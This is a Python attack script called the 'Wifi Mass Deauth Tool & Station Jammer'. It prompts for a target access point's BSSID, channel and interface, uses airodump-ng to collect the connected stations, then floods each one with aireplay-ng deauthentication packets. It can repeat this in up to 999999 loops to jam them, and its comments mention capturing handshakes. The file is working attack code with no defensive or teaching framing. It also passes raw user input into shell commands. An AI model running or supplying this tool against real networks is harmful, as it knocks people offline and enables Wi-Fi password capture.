#!/usr/bin/python3.6


"""
WMDT - Wifi Mass Deauth Tool & Station Jammer

This tool will perform a mass deauthentication on all stations connected to an AP's BSSID
on N channel using the user specified interface and is capable of jamming stations by
continuously sending deauth packets to each station for a specified number of loops

"""

"""Module requirements"""
import sys, subprocess, time

art = """
      ___           ___           ___           ___     
     /\\__\\         /\\__\\         /\\  \\         /\\  \\    
    /:/ _/_       /::|  |       /::\\  \\        \\:\\  \\   
   /:/ /\\__\\     /:|:|  |      /:/\\:\\  \\        \\:\\  \\  
  /:/ /:/ _/_   /:/|:|__|__   /:/  \\:\\__\\       /::\\  \\ 
 /:/_/:/ /\\__\\ /:/ |::::\\__\\ /:/__/ \\:|__|     /:/\:\\__\\
 \\:\\/:/ /:/  / \\/__/~~/:/  / \\:\\  \\ /:/  /    /:/  \\/__/
  \::/_/:/  /        /:/  /   \\:\\  /:/  /    /:/  /     
   \:\\/:/  /        /:/  /     \\:\\/:/  /     \\/__/      
    \::/  /        /:/  /       \\::/__/                 
     \/__/         \\/__/         ~~
          Wifi Mass Deatuh Tool & Station Jammer        
"""

print(art)
print("")

"""Parent working directory"""
subprocess.call("mkdir -p tmp", shell=True)
pwd = subprocess.Popen("pwd", stdout=subprocess.PIPE, shell=True).communicate()[0].decode('utf-8').replace("\n", "")

"""Get required user input"""
timeout = int(input("How long should we montior for stations before performing the deauth attack? [0-999999] "))
bssid = input("What is the BSSID of the AP you wish to attack? ")
channel = input("What channel is the AP running on? ")
interface = input("What interface would you like to use for the deauth attack? ")

"""
Ask user if the monitor device needs to be restarted
"""
answer = input("Do you need to start/restart {}? ".format(interface))
if answer == 'y' or answer == 'Y' or answer == 'Yes' or answer == 'yes':
    subprocess.call("airmon-ng stop {}".format(interface), shell=True)
    subprocess.call("airmon-ng start {}".format(interface.replace('mon', '')), shell=True)

"""Monitor for stations connected to the AP BSSID on N channel"""
print(
    "Scanning for stations connected to {} for {} seconds before continuing to perform the deauth attack".format(bssid,
                                                                                                                 timeout))
subprocess.call(
    "xterm -hold -e 'airodump-ng --channel {} --output-format csv --write-interval 2 --write tmp/MassDeauth {}' &".format(
        channel, interface), shell=True)
time.sleep(timeout)

print("Starting mass deauth attack against {}".format(bssid))

"""
Parse the CSV capture and create our temporary files for stations and bssids
and then load them into variables and commence attack sequence
"""


def deauth():
    subprocess.call(
        "cat tmp/MassDeauth-* | sed -n -e '/Station MAC/,$p' | grep '{}' | cut -d',' -f1 | grep -v 'Station MAC' | grep ':' > tmp/stations.txt".format(
            bssid), shell=True)

    sfh = open('tmp/stations.txt', 'r')
    stations = sfh.readlines()
    sfh.close()

    i = 0
    while i < len(stations):
        if stations[i] != "\r\n":
            cmd = "aireplay-ng -0 1 -a {} -c {} {}".format(bssid, stations[i].replace('\n', ''), interface)
            i += 1
            if "notassociated" not in cmd:
                print("Running: {}".format(cmd))
                subprocess.call(cmd, shell=True)
        else:
            i += 1


"""
Ask user if we are jamming the workstations
or only performing a deauth attack for getting a handshake
and then exiting the attack
"""
answer = input("Do you want to jam the AP BSSID {} stations? ".format(bssid))
if answer == 'y' or answer == 'Y' or answer == 'Yes' or answer == 'yes':
    loop_x_times = int(input("How many deauth attack loops should we perform? [0-999999] "))
    lc = 0
    while lc <= loop_x_times:
        deauth()
        lc += 1
else:
    deauth()

"""Cleanup temporary files if user will not need them"""
answer = input("Perform cleanup before exiting? ")
if answer == 'y' or answer == 'Y' or answer == 'Yes' or answer == 'yes':
    print("Cleaning up...")
    subprocess.call("rm {}/tmp/stations.txt".format(pwd), shell=True)
    subprocess.call("rm {}/tmp/MassDeauth-*.csv".format(pwd), shell=True)
    print("Done")

"""exit successfully"""
sys.exit(0)
